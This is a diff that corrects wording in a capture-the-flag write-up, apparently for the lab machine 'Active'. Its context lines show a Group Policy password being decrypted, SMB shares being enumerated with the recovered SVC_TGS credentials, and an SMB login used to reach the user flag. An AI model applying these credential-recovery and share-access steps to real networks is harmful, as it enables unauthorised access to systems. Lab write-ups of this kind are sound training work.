@@ -94,13 +94,13 @@ gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuN
 
 
 ## FootHold
-Now that we have a credential for `SVC_TGS` account try to check if we are able to connect in other shares
+Now that we have a credential for `SVC_TGS` account try to check if we are able to connect into other shares
 ```bash
 smbmap -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.129.213.81
 ```
 ![[Pasted image 20250607162052.png]]
 
-Now connect to the smb share `Users` and navigate under the user's desktop to find the user.txt flag ``
+Now connect to the smb share `Users` and navigate under the user's desktop to find the user.txt flag 
 ```bash
 smbclient  //10.129.213.81/Users -U "active.htb\SVC_TGS"
 smb: \SVC_TGS\Desktop\> cd SVC_TGS\Desktop
